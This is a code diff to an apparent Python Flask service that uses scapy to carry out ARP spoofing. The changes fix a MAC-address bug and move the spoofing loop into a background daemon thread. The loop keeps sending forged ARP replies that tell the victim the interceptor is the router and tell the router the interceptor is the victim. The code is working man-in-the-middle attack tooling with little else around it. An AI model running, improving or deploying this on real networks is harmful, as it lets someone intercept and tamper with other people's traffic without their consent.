@@ -7,15 +7,18 @@ from werkzeug.exceptions import BadRequest
 import scapy.all as scapy
 import time
 import uuid
+import threading
+
 
 # Gloabal Variables
 ##############################################################################
 OPERATION = 2                                     # Arp Response Package
-SLEEP_TIME = 2                                    # Sleep Time
+SLEEP_TIME = 5                                    # Sleep Time
 RESTORE_PKG_COUNT = 3                             # Restore Package Count
 SPOOFED_LIST = []                                 # List Of Spoofed Targets
 DEBUG = True                                      # Debug Mode
 PORT = 5002                                       # Port Number
+DAEMON_THREAD = True                              # Daemon Thread
 
 app = Flask(__name__)
 api = Api(app)
@@ -44,7 +47,7 @@ arp_spoof_post_args.add_argument("my_mac_addr",     type=str,
 ##############################################################################
 def get_my_mac_addr():
     mac_addr = uuid.getnode()
-    mac_addr = ':'.join(("%012x" % mac)[i:i+2] for i in range(0, 12, 2))
+    mac_addr = ':'.join(("%012x" % mac_addr)[i:i+2] for i in range(0, 12, 2))
     return mac_addr
 ##############################################################################
 
@@ -95,19 +98,34 @@ class ArpSpoof(Resource):
 # Send Spoof Packages
 ##############################################################################
 def send_spoof_packages():
-    for spoofed in SPOOFED_LIST:
-        target_ip_addr  = spoofed['target_ip_addr']
-        target_mac_addr = spoofed['target_mac_addr']
-        router_ip_addr  = spoofed['router_ip_addr']
-        router_mac_addr = spoofed['router_mac_addr']
-        interceptor     = spoofed['interceptor']
+    def run():
+        while True:
+            global SPOOFED_LIST
+            if SPOOFED_LIST:
+                for spoofed in SPOOFED_LIST:
+                    target_ip_addr  = spoofed['target_ip_addr']
+                    target_mac_addr = spoofed['target_mac_addr']
+                    router_ip_addr  = spoofed['router_ip_addr']
+                    router_mac_addr = spoofed['router_mac_addr']
+                    interceptor     = spoofed['interceptor']
 
-        # Send Packet to the Victim to Say I am the Router
-        redirect_arp(target_ip_addr,target_mac_addr,router_ip_addr,interceptor)
+                    # Send Packet to the Victim to Say I am the Router
+                    redirect_arp(target_ip_addr,target_mac_addr,router_ip_addr,interceptor)
 
-        # Send Packet to the Router to Say I am the Victim
-        redirect_arp(router_ip_addr,router_mac_addr,target_ip_addr,interceptor)
+                    # Send Packet to the Router to Say I am the Victim
+                    redirect_arp(router_ip_addr,router_mac_addr,target_ip_addr,interceptor)
 
+                    print("\n\n########################################################################")
+                    print("target_ip_addr : "+str(target_ip_addr))
+                    print("target_mac_addr: "+str(target_mac_addr))
+                    print("router_ip_addr : "+str(router_ip_addr))
+                    print("router_mac_addr: "+str(router_mac_addr))
+                    print("interceptor    : "+str(interceptor))
+                    print("########################################################################")
+                time.sleep(SLEEP_TIME)
+    thread = threading.Thread(target=run)
+    thread.daemon = DAEMON_THREAD
+    thread.start()
 ##############################################################################
 
 
@@ -121,8 +139,8 @@ api.add_resource(ArpSpoof, '/api/arp_spoof')
 ##############################################################################
 if __name__ == '__main__':
     try:
-        app.run(debug=DEBUG,port=PORT)
         send_spoof_packages()
+        app.run(debug=DEBUG,port=PORT,threaded=True) 
     except KeyboardInterrupt:
         print("\n[-] Arp Tables Restoring...")
         '''
